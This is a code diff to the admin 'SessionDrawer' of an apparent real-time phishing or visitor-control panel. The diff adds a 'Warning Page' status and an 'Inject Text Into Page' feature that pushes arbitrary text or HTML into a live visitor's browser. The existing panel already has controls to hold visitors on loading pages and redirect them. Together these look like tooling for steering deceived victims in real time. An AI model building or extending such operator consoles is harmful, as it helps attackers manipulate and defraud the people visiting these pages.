@@ -60,7 +60,8 @@ const SessionDrawer = (() => {
       } catch { metadata = {}; }
 
       const pagePath = (s.current_page || '').toLowerCase();
-      const isHolding = s.is_active && SessionTemplates.isLoadingPage(pagePath);
+      const isHolding = s.is_active && SessionTemplates.isLoadingPage(pagePath, s.current_page_type);
+      const isWarning = s.is_active && s.current_page_type === 'warning';
 
       const infoGridHtml = SessionTemplates.renderInfoGrid(s);
       const timelineHtml = SessionTemplates.renderTimeline(pageViews);
@@ -76,6 +77,10 @@ const SessionDrawer = (() => {
               ${isHolding 
                 ? `<span class="status-badge holding" style="font-size:8px; padding:1px 6px;">
                      ⏳ Holding
+                   </span>`
+                : isWarning
+                ? `<span class="status-badge" style="font-size:8px; padding:1px 6px; background:rgba(239,68,68,0.15); color:#ef4444; border:1px solid rgba(239,68,68,0.3);">
+                     🚨 Warning
                    </span>`
                 : `<span class="status-badge ${s.is_active ? 'online' : 'offline'}" style="font-size:8px; padding:1px 6px;">
                      ${s.is_active ? 'Live' : 'Offline'}
@@ -108,6 +113,16 @@ const SessionDrawer = (() => {
                </div>`
             : ''
           }
+          ${isWarning
+            ? `<div style="background:rgba(239,68,68,0.06); border:1px solid rgba(239,68,68,0.22); border-radius:10px; padding:12px; margin-bottom:16px; display:flex; gap:10px; align-items:center; font-size:12.5px; color:#ef4444;">
+                 <span style="font-size:18px;">🚨</span>
+                 <div>
+                   <strong style="display:block; color:#ef4444;">Visitor is on a Warning/Alert Page</strong>
+                   Use the Inject Text panel below to send a custom message to the visitor's page in real-time.
+                 </div>
+               </div>`
+            : ''
+          }
           <!-- Render Info tab content by default -->
           <div class="detail-section">
             <div class="detail-sec-title">Visitor Information</div>
@@ -116,18 +131,38 @@ const SessionDrawer = (() => {
         </div>
 
         <div class="detail-footer" style="display:flex; flex-direction:column; gap:12px;">
+          <!-- Inject Text Panel — visible for active sessions only -->
+          ${s.is_active ? `
+          <div style="border:1px solid rgba(99,102,241,0.25); border-radius:10px; overflow:hidden;">
+            <div id="inject-panel-toggle" style="display:flex; justify-content:space-between; align-items:center; padding:9px 12px; background:rgba(99,102,241,0.07); cursor:pointer; user-select:none;">
+              <span style="font-size:11px; font-weight:700; color:#a5b4fc; letter-spacing:0.3px;">✏️ Inject Text Into Page</span>
+              <span id="inject-chevron" style="font-size:10px; color:var(--text-tertiary); transition:transform 0.2s;">▼</span>
+            </div>
+            <div id="inject-panel-body" style="display:none; padding:10px 12px; background:rgba(99,102,241,0.03); border-top:1px solid rgba(99,102,241,0.15);">
+              <textarea id="inject-text-input" placeholder="Type text or HTML to inject into the visitor's page…" style="width:100%; height:70px; resize:vertical; background:rgba(15,15,20,0.6); border:1px solid rgba(99,102,241,0.3); border-radius:7px; padding:8px 10px; color:var(--text-primary); font-size:12px; font-family:Inter,sans-serif; outline:none; line-height:1.5; box-sizing:border-box;"></textarea>
+              <div style="display:flex; gap:6px; margin-top:8px;">
+                <button id="inject-send-btn" style="flex:2; padding:7px; background:linear-gradient(135deg,#6366f1,#4f46e5); color:#fff; border:none; border-radius:7px; font-size:11px; font-weight:700; cursor:pointer; font-family:Inter,sans-serif;">💉 Inject</button>
+                <button id="inject-clear-btn" style="flex:1; padding:7px; background:rgba(239,68,68,0.1); border:1px solid rgba(239,68,68,0.22); color:#ef4444; border-radius:7px; font-size:11px; font-weight:600; cursor:pointer;">✖ Clear</button>
+              </div>
+              <p style="margin:6px 0 0; font-size:10px; color:var(--text-muted); line-height:1.4;">The visitor's page must contain <code style="background:rgba(255,255,255,0.07); padding:1px 4px; border-radius:3px;">data-alp-inject</code> element. Supports plain text or HTML.</p>
+            </div>
+          </div>
+          ` : ''}
+
           <!-- Status Header -->
           <div style="font-size:10px; font-weight:700; color:var(--text-muted); text-transform:uppercase; letter-spacing:0.5px; display:flex; justify-content:space-between; align-items:center;">
             <span>Session Controls</span>
             ${isHolding 
               ? '<span style="color:#f59e0b; font-weight:bold; animation: alertBlink 1.2s infinite;">⚠️ Awaiting Release</span>'
+              : isWarning
+              ? '<span style="color:#ef4444; font-weight:bold; animation: alertBlink 1.2s infinite;">🚨 Warning Page</span>'
               : `<span style="color:${s.is_active ? '#10b981' : 'var(--text-tertiary)'}; text-transform:none;">${s.is_active ? '● Active' : 'Offline'}</span>`
             }
           </div>
 
           <!-- Action Buttons Row -->
           <div style="display:flex; gap:8px;">
-            <button id="detail-redirect-modal-trigger" data-sid="${s.id}" style="flex:2; padding:9px; background:linear-gradient(135deg,#6366f1,#4f46e5); color:#fff; border:none; border-radius:8px; font-size:12px; font-weight:600; cursor:pointer; font-family:Inter,sans-serif; display:flex; align-items:center; justify-content:center; gap:6px;" ${s.is_active ? '' : 'disabled'} title="Redirect Visitor">
+            <button id="detail-redirect-modal-trigger" data-sid="${s.id}" style="flex:2; padding:9px; background:linear-gradient(135deg,#D4AF37,#B8962E); color:#0a0a0a; border:none; border-radius:8px; font-size:12px; font-weight:700; cursor:pointer; font-family:Inter,sans-serif; display:flex; align-items:center; justify-content:center; gap:6px;" ${s.is_active ? '' : 'disabled'} title="Redirect Visitor">
               ↗️ Redirect Visitor
             </button>
             
@@ -147,6 +182,56 @@ const SessionDrawer = (() => {
       // Connect close button
       const closeBtn = panel.querySelector('#detail-close');
       if (closeBtn) closeBtn.addEventListener('click', close);
+
+      // Inject panel toggle
+      const injectToggle = panel.querySelector('#inject-panel-toggle');
+      const injectBody = panel.querySelector('#inject-panel-body');
+      const injectChevron = panel.querySelector('#inject-chevron');
+      if (injectToggle && injectBody) {
+        injectToggle.addEventListener('click', () => {
+          const open = injectBody.style.display !== 'none';
+          injectBody.style.display = open ? 'none' : 'block';
+          if (injectChevron) injectChevron.style.transform = open ? '' : 'rotate(180deg)';
+        });
+      }
+
+      // Inject send button
+      const injectSendBtn = panel.querySelector('#inject-send-btn');
+      const injectInput = panel.querySelector('#inject-text-input');
+      if (injectSendBtn && injectInput) {
+        injectSendBtn.addEventListener('click', async () => {
+          const text = injectInput.value;
+          try {
+            if (window.ALPSocket && typeof window.ALPSocket.injectText === 'function') {
+              window.ALPSocket.injectText(s.id, text);
+            } else {
+              await window.ALPApi.injectText(s.id, text);
+            }
+            window.showToast('✅ Text injected!', 'success');
+          } catch (e) {
+            window.showToast('Failed to inject: ' + e.message, 'error');
+          }
+        });
+      }
+
+      // Inject clear button
+      const injectClearBtn = panel.querySelector('#inject-clear-btn');
+      if (injectClearBtn) {
+        injectClearBtn.addEventListener('click', async () => {
+          if (injectInput) injectInput.value = '';
+          try {
+            if (window.ALPSocket && typeof window.ALPSocket.injectText === 'function') {
+              window.ALPSocket.injectText(s.id, '');
+            } else {
+              await window.ALPApi.injectText(s.id, '');
+            }
+            window.showToast('✅ Injection cleared!', 'success');
+          } catch (e) {
+            window.showToast('Failed to clear: ' + e.message, 'error');
+          }
+        });
+      }
+
 
       // Connect tab buttons
       const tabButtons = panel.querySelectorAll('.detail-tab');
